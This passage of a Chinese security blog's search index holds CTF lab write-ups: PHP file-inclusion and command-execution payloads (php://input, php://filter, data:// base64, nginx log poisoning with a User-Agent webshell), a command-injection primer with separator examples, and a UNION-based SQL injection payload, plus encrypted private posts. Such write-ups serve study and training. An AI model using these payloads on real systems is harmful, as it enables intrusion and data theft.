flag.php;);</code></p><p>GET：<code>?c=include$_GET[1]?&gt;&amp;1=php://input</code></p><p>POST：<code>&lt;?php system(&#39;tac flag.php&#39;);?&gt;</code></p><p>需要注意,因为POST没有按照key&#x3D;value封装数据, 因此hackBar认为数据有问题, 不会发送数据, 可以使用Burp Suite发送数据</p><p>补充:    <code>php://input</code>默认读取没有处理过的POST数据</p><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><h4 id="可用伪协议"><a href="#可用伪协议" class="headerlink" title="可用伪协议"></a>可用伪协议</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span>%0A<span class="hljs-variable">$_GET</span>[a]<span class="hljs-string">?&gt;</span>&amp;a=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h4 id="日志注入"><a href="#日志注入" class="headerlink" title="日志注入"></a>日志注入</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[a]?%<span class="hljs-number">3</span>E&amp;a=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>var<span class="hljs-regexp">/log/</span>nginx/access.log<br></code></pre></td></tr></table></figure><p>在ua头加入一句话木马即可</p><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><p>利用伪协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?c=data:<span class="hljs-regexp">//</span>text/plain,<span class="hljs-variable">%3C</span>?=<span class="hljs-keyword">system</span>(<span class="hljs-variable">%2</span>2tac<span class="hljs-variable">%20f</span>*<span class="hljs-variable">%22</span>)?<span class="hljs-variable">%3E</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行</title>
    <link href="/2025/01/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2025/01/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="命令执行常见函数："><a href="#命令执行常见函数：" class="headerlink" title="命令执行常见函数："></a>命令执行常见函数：</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span>    <span class="hljs-comment">// 执行外部程序并显示输出</span><br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">()</span></span>      <span class="hljs-comment">// 执行外部程序</span><br><span class="hljs-function"><span class="hljs-title">passthru</span><span class="hljs-params">()</span></span>  <span class="hljs-comment">// 执行外部程序并显示原始输出</span><br><span class="hljs-function"><span class="hljs-title">shell_exec</span><span class="hljs-params">()</span></span> <span class="hljs-comment">// 通过shell执行命令</span><br>`` ``<br>(反引号)    <span class="hljs-comment">// 执行shell命令</span><br><span class="hljs-function"><span class="hljs-title">popen</span><span class="hljs-params">()</span></span>     <span class="hljs-comment">// 打开进程文件指针</span><br><span class="hljs-function"><span class="hljs-title">proc_open</span><span class="hljs-params">()</span></span> <span class="hljs-comment">// 执行命令并打开文件指针</span><br></code></pre></td></tr></table></figure><h2 id="常用连接符："><a href="#常用连接符：" class="headerlink" title="常用连接符："></a>常用连接符：</h2><pre><code class="hljs">; 顺序执行多条命令(Unix)&amp; 后台执行&amp;&amp; 前一条成功才执行后一条| 管道符|| 前一条失败才执行后一条\n(换行符) 也可作为命令分隔符</code></pre><h3 id="管道符："><a href="#管道符：" class="headerlink" title="管道符："></a>管道符：</h3><p>在命令注入攻击中，管道符可以：</p><p><strong>串联多个命令</strong>：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">http://example.<span class="hljs-keyword">com</span>/vuln.php?<span class="hljs-built_in">input</span>=<span class="hljs-keyword">file</span>.txt|whoami<br></code></pre></td></tr></table></figure><p>尝试执行<code>file.txt</code>后接着执行<code>whoami</code></p><p><strong>过滤或处理输出</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://example.com/vuln.php?input=<span class="hljs-built_in">ls</span>|<span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure><p>将<code>ls</code>命令的输出进行base64编码</p>]]></content>
    
    
    <categories>
      
      <category>web漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2025/01/02/CTF-sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/01/02/CTF-sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="无过滤注入"><a href="#无过滤注入" class="headerlink" title="无过滤注入"></a>无过滤注入</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p><img src="/images/web171.jpg"></p><ol><li><strong>闭合单引号</strong>：通过输入<code>&#39;</code>闭合id参数的单引号。</li><li><strong>注入UNION查询</strong>：使用<code>UNION SELECT</code>获取其他数据，确保列数与原查询一致。</li><li><strong>绕过原查询条件</strong>：直接查询username为’flag’的记录，因为UNION后的SELECT不受原查询的<code>username != &#39;flag&#39;</code>限制。</li><li><strong>注释剩余部分</strong>：使用<code>--</code>注释掉原SQL的剩余部分，避免语法错误。</li></ol><p>观察到有三列，两种解发均可，后者会带出id&#x3D;1的那一行，没啥作用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; union select username,password,1 from ctfshow_user where username=&#x27;</span>flag<span class="hljs-string">&#x27; -- </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> username,password,<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p>布尔、时间盲注、sqlmap、堆叠注入见csdn</p><p><a href="https://blog.csdn.net/cz0726/article/details/147434563?fromshare=blogdetail&sharetype=blogdetail&sharerId=147434563&sharerefer=PC&sharesource=cz0726&sharefrom=from_link">https://blog.csdn.net/cz0726/article/details/147434563?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=147434563&amp;sharerefer=PC&amp;sharesource=cz0726&amp;sharefrom=from_link</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>北京中科全安实习总结</title>
    <link href="/2024/09/21/%E5%8C%97%E4%BA%AC%E4%B8%AD%E7%A7%91%E5%85%A8%E5%AE%89%E5%AE%9E%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2024/09/21/%E5%8C%97%E4%BA%AC%E4%B8%AD%E7%A7%91%E5%85%A8%E5%AE%89%E5%AE%9E%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7c98a6ae9cf2de08a04ad066da7ba3342e406ed7d72d3d0d66875090603a7120">75b764c9e13fd99acaf0f71a5cd36f2bab4686701997416bcb22b33946400c3786683fd563fe2234994d7e782436b90617b02968cfe45decaf0db46e7a8affd4603250393a1259c059eef293e095afc6b568dd013bcc2852c1a1bd6d80ad6b1f004d39438767aa4444fc46d91c720015fdfbc5f29451d6d928ce4383b4b705ff20683d3a0f811eed70c94ff1bafdf0ac22a0e3adf8c7e0e6dfbbc6096c6e05e5782553251c8cb726997f8c1d0ce63bc708d8f29f97f5b559c0f89729de61a915a7738ea098347f7e4f6a0366766b22e0a361771b1edc5d03562392ce2f99c509202a3679a8973288fd0e3ef41ef08194bc3e2bd2e9f6cd6cfbbbb649cdf7dbd2ad361b259594fe71868cce0863095771fee71db1a2866053a5e1e73783efb4df50983a1819a8cbd6ed111275cd8a92c7525f3a40d4b3db6e653b49c80dec7c93e22d6340205533da1cdcb10723f003596c45d74aac2b59e69b0e130f7a9e3f80462f5af6bb5318b82a02d919c4227fb89bbc0994ea71973845e1a63a67ebfbe5460ca7e956fd108dea9513fc2ca3c5105c0fa96088a16648f4d3d86d841fd12998d0b2b8f0751a4c6fa547dfea952dbcd478e34d62ab9844eefb14d9842aa926960f399eeee91de397885d5f7a6cf434536bf8f0570c38b9b766e180c9ec2eeeba49a2fce9c6c0e72bc040f57e5a1f4fecbc0316d0008e4ed08b732daa49a548973998a6d079c3d83a4c5906e8ca5768c23d46bb77025bafc1fbef7c0b4b47c018a3f844e06c35afcb2586b4b31816bf4dc8b69c7fe17fbe148ab9d8d4584d08ef83afa2a24b03f199cf7610183eb0bd7ee990c80984398cfc12053e3ba07f5b7b6d4ce07428e4423c862240b28b0a1a5dbe9a5fc0cda06bfea79f2cb64d6328d02c3128604433d5d0872d8439745ca6d8cfdabdd1bbdc3c5c6fad381c0c51bc86c1918d244290751fe887462d7ee32e653c6fcd36fe7a4efc6718b8255fbff0441d809d0a33da2b75483bbaf5a5b52731c1dbeb95e32108f8554d160a7f5cd5cfc0abc2852a4490d468e5ebbcfd3673ea01a8146c3d01de954267537e1731c2eb06de66a7ed6e5a9c6fd954fb0088b3aa16d1e85a0da2169c77898e401f313b2df72718464fca9db27c5c118dd50345f81cc7fb9e8ee8e28240d777b148281f3ead99af65ac3da1466388068c3d38e6fbb1c9dde5a633fc8ffaf19df7c64db59b817c5192e7d927b6d2b12a8dd0ad11</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">这是我的私人空间，请勿随意查看。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2024国家护网</title>
    <link href="/2024/08/24/2024%E5%9B%BD%E5%AE%B6%E6%8A%A4%E7%BD%91/"/>
    <url>/2024/08/24/2024%E5%9B%BD%E5%AE%B6%E6%8A%A4%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a13cb1e8caca3427231fd13d26197e0135aa224dfe855370d083598b319d0620"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">这是我的私人空间，请勿随意查看。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>basic auth认证爆破</title>
    <link href="/2024/06/10/basic%20auth%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/"/>
    <url>/2024/06/10/basic%20auth%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/</url>
    
    <content type="html"><![CDATA[<p>basic auth认证爆破：</p><p><img src="/../images/a3a11e46-8297-4e2f-8f62-2913a2dac4df.png" alt="a3a11e46-8297-4e2f-8f62-2913a2dac4df"></p><p>账号密码加密隐藏</p><p><img src="/../images/9011a024-6d09-4038-91ce-2c54f680d1cd.png" alt="9011a024-6d09-4038-91ce-2c54f680d1cd"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
